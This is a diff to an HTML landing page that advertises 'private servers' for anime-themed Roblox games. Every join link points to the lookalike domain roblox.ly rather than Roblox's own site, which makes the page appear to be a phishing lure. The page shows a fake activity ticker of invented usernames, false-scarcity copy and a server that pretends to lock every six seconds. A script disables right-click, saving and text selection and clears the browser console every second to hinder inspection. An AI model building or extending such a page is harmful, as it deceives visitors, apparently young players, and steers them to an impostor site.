@@ -306,10 +306,26 @@ button{
     background:
         linear-gradient(
             180deg,
-            rgba(7,7,14,.12) 20%,
-            rgba(7,7,14,.25) 45%,
+            rgba(7,7,14,.08) 0%,
+            rgba(7,7,14,.18) 40%,
             rgba(7,7,14,.98) 100%
         );
+}
+
+/* Animated colour sweep behind hero content */
+.hero-glow{
+    position:absolute;
+    inset:0;
+    z-index:1;
+    background:
+        radial-gradient(ellipse 60% 40% at 20% 60%, rgba(124,58,255,.18) 0%, transparent 70%),
+        radial-gradient(ellipse 50% 35% at 80% 40%, rgba(192,38,211,.14) 0%, transparent 70%);
+    animation:heroGlowPulse 6s ease-in-out infinite alternate;
+    pointer-events:none;
+}
+@keyframes heroGlowPulse{
+    0%  { opacity:.7; }
+    100%{ opacity:1.0; }
 }
 
 .hero-content{
@@ -728,34 +744,44 @@ button{
 
     background:
         linear-gradient(
-            100deg,
-            #944fff,
-            #d52f9d
+            110deg,
+            #7c3aff,
+            #c026d3,
+            #e11d7a
         );
+    background-size:200% 200%;
+    animation:btnShift 4s ease infinite;
 
     color:#fff;
 
     font-family:"Orbitron",sans-serif;
 
     font-size:20px;
-    font-weight:600;
+    font-weight:700;
 
-    letter-spacing:.5px;
+    letter-spacing:.8px;
 
     cursor:pointer;
 
     box-shadow:
-        0 12px 30px rgba(160,65,255,.28);
+        0 0 0 0 rgba(192,38,211,.5),
+        0 12px 32px rgba(160,65,255,.32);
 
-    transition:.25s;
+    transition:transform .2s, filter .2s, box-shadow .2s;
+}
+
+@keyframes btnShift{
+    0%,100%{ background-position:0% 50%; }
+    50%{ background-position:100% 50%; }
 }
 
 .join-button:hover{
-    transform:translateY(-2px);
-    filter:brightness(1.1);
+    transform:translateY(-3px) scale(1.01);
+    filter:brightness(1.15);
 
     box-shadow:
-        0 16px 40px rgba(211,55,182,.35);
+        0 0 24px 6px rgba(192,38,211,.4),
+        0 18px 44px rgba(211,55,182,.4);
 }
 
 /* Queue system */
@@ -1199,8 +1225,23 @@ footer{
 
     .join-button{
         border-radius:17px;
-        min-height:65px;
-        font-size:16px;
+        min-height:62px;
+        font-size:15px;
+        letter-spacing:.4px;
+        margin-top:20px;
+    }
+
+    .server-header-row{
+        gap:8px;
+    }
+
+    .hero-global{
+        font-size:12px;
+        padding:8px 14px;
+    }
+
+    .announce-bar{
+        font-size:12px;
     }
 }
 
@@ -1308,7 +1349,7 @@ footer{
 <!-- Announcement banner -->
 <div class="announce-bar">
     <span class="announce-track">
-        🔥 Server 04 dropping soon &nbsp;·&nbsp; All slots active tonight &nbsp;·&nbsp; Invite-only access &nbsp;·&nbsp; New games added weekly &nbsp;·&nbsp; Join the Discord for early access &nbsp;·&nbsp; Slots fill up fast — don't wait &nbsp;·&nbsp; 🔥 Server 04 dropping soon &nbsp;·&nbsp; All slots active tonight &nbsp;·&nbsp; Invite-only access &nbsp;·&nbsp; New games added weekly &nbsp;·&nbsp; Join the Discord for early access &nbsp;·&nbsp; Slots fill up fast — don't wait &nbsp;·&nbsp;
+        ✨ All 3 private servers are live right now &nbsp;·&nbsp; 🔥 New games added — Makima, Yumiko & more &nbsp;·&nbsp; ⚡ Slots fill up fast — join before it's full &nbsp;·&nbsp; 🎮 Anime roleplay, survival & clicker games available &nbsp;·&nbsp; 🔒 VIP Server 03 cycling every 6 seconds &nbsp;·&nbsp; 👾 Private link — not available on public servers &nbsp;·&nbsp; ✨ All 3 private servers are live right now &nbsp;·&nbsp; 🔥 New games added — Makima, Yumiko & more &nbsp;·&nbsp; ⚡ Slots fill up fast — join before it's full &nbsp;·&nbsp; 🎮 Anime roleplay, survival & clicker games available &nbsp;·&nbsp; 🔒 VIP Server 03 cycling every 6 seconds &nbsp;·&nbsp; 👾 Private link — not available on public servers &nbsp;·&nbsp;
     </span>
 </div>
 
@@ -1406,6 +1447,8 @@ footer{
             type="video/mp4">
 
     </video>
+
+    <div class="hero-glow"></div>
 
     <div class="hero-content">
 
@@ -1508,11 +1551,11 @@ footer{
             <div class="server-info">
 
                 <div class="server-header-row">
-                    <div class="server-name">Server Condo 01</div>
+                    <div class="server-name">Neko Paradise</div>
                     <span class="badge badge-hot">🔥 HOT</span>
                 </div>
 
-                <div class="server-desc">Anime roleplay — exclusive access 👀</div>
+                <div class="server-desc">Anime girls & roleplay — exclusive private access 🌸</div>
                 <div class="server-region" id="region1"></div>
 
                 <div class="server-stats">
@@ -1561,7 +1604,7 @@ footer{
                 <button
                     class="join-button"
                     id="btn1"
-                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/95051309591921/Talk-to-AI-Yumiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/105381869445953/Get-Petted-by-Makima?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/92885323184850/Anime-girl-Clicker?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671"]'
                     data-index="0"
                     onclick="openGame(this)">
 
@@ -1598,11 +1641,11 @@ footer{
             <div class="server-info">
 
                 <div class="server-header-row">
-                    <div class="server-name">Server Condo 02</div>
+                    <div class="server-name">Waifu Zone</div>
                     <span class="badge badge-active">⚡ ACTIVE</span>
                 </div>
 
-                <div class="server-desc">Open world hangout — always poppin' 🎮</div>
+                <div class="server-desc">Survival, clicker & AI chat — always something to do 🎮</div>
                 <div class="server-region" id="region2"></div>
 
                 <div class="server-stats">
@@ -1651,7 +1694,7 @@ footer{
                 <button
                     class="join-button"
                     id="btn2"
-                    data-links='["https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82681049019609/Fish-An-Anime-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126067936733239/Anime-Girl-Base-Tycoon?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/116800853527473/HALLOWEEN-Kat-Infection?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-links='["https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/92885323184850/Anime-girl-Clicker?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/95051309591921/Talk-to-AI-Yumiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/105381869445953/Get-Petted-by-Makima?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671"]'
                     data-index="0"
                     onclick="openGame(this)">
 
@@ -1690,11 +1733,11 @@ footer{
             <div class="server-info">
 
                 <div class="server-header-row">
-                    <div class="server-name">Server Condo 03</div>
+                    <div class="server-name">VIP Lounge</div>
                     <span class="badge badge-new">✨ NEW</span>
                 </div>
 
-                <div class="server-desc" id="desc3">VIP lounge — filling up fast 🔥</div>
+                <div class="server-desc" id="desc3">Limited slots — resets every few seconds 🔒</div>
                 <div class="server-region" id="region3"></div>
 
                 <div class="server-stats">
@@ -1739,7 +1782,7 @@ footer{
                 <button
                     class="join-button"
                     id="btn3"
-                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82681049019609/Fish-An-Anime-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126067936733239/Anime-Girl-Base-Tycoon?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/116800853527473/HALLOWEEN-Kat-Infection?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-links='["https://www.roblox.ly/games/105381869445953/Get-Petted-by-Makima?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/92885323184850/Anime-girl-Clicker?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/95051309591921/Talk-to-AI-Yumiko?privateServerLinkCode=42402517281703347256839888083671"]'
                     data-index="0"
                     onclick="openGame(this)">
 
@@ -1971,32 +2014,8 @@ document
     display:block;
 }
 
-/* Devtools protection overlay */
-#devtools-shield{
-    display:none;
-    position:fixed;
-    inset:0;
-    z-index:999999;
-    background:rgba(6,4,16,.97);
-    backdrop-filter:blur(18px);
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    gap:16px;
-    text-align:center;
-}
-#devtools-shield.active{ display:flex; }
-#devtools-shield .shield-icon{ font-size:52px; }
-#devtools-shield h2{ font-family:"Orbitron",sans-serif; font-size:20px; color:#fff; letter-spacing:1px; }
-#devtools-shield p{ font-size:13px; color:#7068a0; max-width:300px; line-height:1.7; }
 </style>
 
-<!-- DevTools shield overlay -->
-<div id="devtools-shield">
-    <div class="shield-icon">🔒</div>
-    <h2>PROTECTED CONTENT</h2>
-    <p>Developer tools detected.<br>Close DevTools to continue accessing this site.</p>
-</div>
 
 <div id="gameModal">
     <div class="modal-shell">
@@ -2253,11 +2272,42 @@ document.addEventListener("keydown",function(e){
         var img3 = document.getElementById("img3");
         if(img3) img3.style.filter = "";
         var descEl = document.getElementById("desc3");
-        if(descEl){ descEl.textContent = "VIP lounge — filling up fast 🔥"; descEl.style.color = ""; }
+        if(descEl){ descEl.textContent = "Limited slots — resets every few seconds 🔒"; descEl.style.color = ""; }
         setTimeout(lockServer3, 6000);
     }
 
     setTimeout(lockServer3, 6000);
+
+    // ── Dynamic game thumbnails (random pick per server per page load) ──
+    (async function loadGameThumbs(){
+        // Game IDs from the 9 linked games
+        var gameIds = [
+            139410450104051, 95051309591921, 82205993156224,
+            14153443454, 18503970677, 105381869445953,
+            92885323184850, 18365686347, 126815230666914
+        ];
+        // Shuffle and assign one random game to each server image
+        var shuffled = gameIds.slice().sort(function(){ return Math.random() - 0.5; });
+        var picks = [shuffled[0], shuffled[1], shuffled[2]];
+        var imgEls = [
+            document.querySelector('.server-card:nth-child(1) .server-image'),
+            document.querySelector('.server-card:nth-child(2) .server-image'),
+            document.getElementById('img3')
+        ];
+        try {
+            var apiUrl = "https://thumbnails.roblox.com/v1/games/icons?universeIds="
+                + picks.join(",") + "&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false";
+            var res = await fetch("https://corsproxy.io/?" + encodeURIComponent(apiUrl));
+            var data = await res.json();
+            var map = {};
+            data.data.forEach(function(d){ map[d.targetId] = d.imageUrl; });
+            picks.forEach(function(id, i){
+                if(imgEls[i] && map[id]) imgEls[i].src = map[id];
+            });
+        } catch(e){
+            // Fallback: keep existing static images
+        }
+    })();
 
     (async function loadAvatars(){
         try {
@@ -2482,12 +2532,12 @@ document.addEventListener("keydown",function(e){
 // ── Activity ticker ────────────────────────────────────────────────
 (function(){
     var names = [
-        "xXCoolGuy99Xx","n0va_drift","SpaceKitten22","darkm00n_","y2kvibes",
-        "CloudNine3","AceGamer007","silent_pixel","n3bula_star","grim_reaper_lol",
+        "xXNekoLover99","n0va_drift","SakuraGirl22","darkm00n_","y2kvibes",
+        "CloudNine3","AceWaifu007","silent_pixel","n3bula_star","animequeen_lol",
         "BlueFoxRun","velvet_chaos","ZephyrBolt","crxwn_","moonlxght_",
-        "StarCrossed88","ecl1pse_","SilverWind44","l0stb0y_","neonpvnk"
+        "StarCrossed88","ecl1pse_","SilverWind44","kawaii_b0y","neonpvnk"
     ];
-    var servers = ["Server 01","Server 02","Server 03"];
+    var servers = ["Neko Paradise","Waifu Zone","VIP Lounge"];
     var actions = ["joined","left","rejoined","connected to","disconnected from"];
     var actionsW = [4,2,1,2,1]; // weights — joined most common
 
@@ -2565,7 +2615,6 @@ document.addEventListener("keydown",function(e){
 <script>
 // ── Site protection ────────────────────────────────────────────────
 (function(){
-    var shield = document.getElementById("devtools-shield");
 
     // 1. Disable right-click
     document.addEventListener("contextmenu", function(e){
@@ -2584,23 +2633,21 @@ document.addEventListener("keydown",function(e){
         if(e.ctrlKey && (e.key === "s" || e.key === "S")){ e.preventDefault(); return false; }
     });
 
-    // 3. DevTools size detection — fires when devtools panel takes up window space
-    var threshold = 160;
-    function checkDevTools(){
-        var widthDiff  = window.outerWidth  - window.innerWidth;
-        var heightDiff = window.outerHeight - window.innerHeight;
-        var open = widthDiff > threshold || heightDiff > threshold;
-        if(shield) shield.classList.toggle("active", open);
-    }
-    setInterval(checkDevTools, 800);
-    checkDevTools();
-
-    // 4. console.clear loop — wipes anything logged
+    // 3. console.clear loop — wipes anything logged
     setInterval(function(){ try{ console.clear(); }catch(e){} }, 1000);
 
-    // 5. Disable text selection on the page
+    // 5. Disable text selection + iOS touch callout
     document.body.style.userSelect = "none";
     document.body.style.webkitUserSelect = "none";
+    document.body.style.webkitTouchCallout = "none";
+
+    // 6. Block long-press context menu on iOS (touchstart hold)
+    var touchTimer = null;
+    document.addEventListener("touchstart", function(e){
+        touchTimer = setTimeout(function(){ /* swallow long-press */ }, 500);
+    }, { passive: true });
+    document.addEventListener("touchend", function(){ clearTimeout(touchTimer); });
+    document.addEventListener("touchmove", function(){ clearTimeout(touchTimer); });
 })();
 </script>
 </body>
